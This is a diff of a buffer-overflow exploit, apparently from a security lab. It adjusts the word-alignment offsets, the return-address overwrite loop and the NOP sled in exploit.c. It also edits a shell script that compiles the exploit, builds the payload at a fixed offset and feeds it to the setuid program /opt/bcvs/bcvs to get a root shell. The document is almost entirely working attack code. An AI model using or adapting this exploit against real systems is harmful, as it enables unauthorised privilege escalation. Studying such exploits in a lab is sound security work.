@@ -63,7 +63,7 @@ void main(int argc, char* argv[]) {
 
   ptr = buff;
   //add 1 to account for shifting the bytes to align on word boundaries
-  long_ptr = (long *) (ptr + 1);
+  long_ptr = (long *) (ptr + 2);
 
   char *temp = ptr;
   for (i = 0; temp < (buff+bsize); i++) {
@@ -71,12 +71,12 @@ void main(int argc, char* argv[]) {
   }
 
 
-  for (i = 0; long_ptr < (buff + STOP_ADDR - 1); i += 4) {
+  for (i = 0; long_ptr < (buff + STOP_ADDR - 2); i += 4) {
 	*(long_ptr++) = addr;
   }
 
   // Setup the nop sled
-  char *buf_ptr = (char *) (ptr + 559); 
+  char *buf_ptr = (char *) (ptr + START_NOPS); 
   for (i = (buff + START_NOPS); i < (buff + bsize); ++i) {
     *(buf_ptr++) = NOP;
     //buff[i] = NOP;
@@ -98,17 +98,25 @@ EOS
 gcc -o exploit exploit.c
 
 OFFSET=1139
+#OFFSET=1000
 
+echo "hey" > "haxor"
+
+#while :
+#do
 SHELL_CODE=$($EXPLOIT_EXE)
 #echo "$SHELL_CODE"
 
 SHELL_CODE=$($EXPLOIT_EXE $OFFSET)
-if [[ $? -ne 0 ]]; then
-  echo "Failed to generate shellcode"
-  exit -1
-fi
-
+#if [[ $? -ne 0 ]]; then
+#/opt/bcvs/bcvs co blah < haxor
+#else
 /opt/bcvs/bcvs co "${SHELL_CODE}"
 
+#fi
+#echo "${SHELL_CODE}"
+#((OFFSET++))
+#echo "${OFFSET}"
+#done
 #/usr/bin/gdb /opt/bcvs/bcvs
 # And then hopefully you have a root shell at this point
